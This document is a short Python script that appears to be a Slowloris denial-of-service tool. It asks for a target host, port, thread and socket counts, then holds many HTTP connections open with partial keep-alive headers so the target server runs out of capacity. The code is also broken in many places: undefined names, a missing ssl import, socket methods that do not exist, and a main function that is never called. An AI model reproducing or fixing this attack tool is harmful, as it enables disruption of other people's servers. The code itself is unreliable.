import socket,threading,time,random,logging
target=input("[+] URL/IP: ")
port=int(input("[+] Port: "))
threads=int(input("[+] Threads: "))
socket_count=int(input("[+] Sockets: "))
https=input("[+] HTTPS [Y/N]? ")
if https == Y|y:
   https = True
   print("[+] HTTPS set to 'True'.")
elif https == N|n:
   https = False
   print("[+] HTTPS set to 'False'.")
randuseragent=input("[+] Random user agent [Y/N]? ")
if randuseragent == Y|y:
   randuseragent = True
   print("[+] Random user agent 'ON'.")
elif randuseragent == N|n:
   randuseragent = False
   print("[+] Random user agent 'OFF'.")
def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    if https:
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(s, server_hostname=target)

    s.connect((target, port))

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    ua = user_agents[0]
    if randuseragent:
        ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s


def main():
    ip = target
    socket_count = socket_count
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating sockets...")
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)

    while True:
        try:
            logging.info(
                "Sending keep-alive headers... Socket count: %s",
                len(list_of_sockets),
            )
            for s in list(list_of_sockets):
                try:
                    s.send_header("X-a", random.randint(1, 5000))
                except socket.error:
                    list_of_sockets.remove(s)

            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug("Recreating socket...")
                try:
                    s = init_socket(ip)
                    if s:
                        list_of_sockets.append(s)
                except socket.error as e:
                    logging.debug(e)
                    break
            logging.debug("Sleeping for %d seconds", args.sleeptime)
            time.sleep(args.sleeptime)

        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break
for i in range(int(threads)):
  break
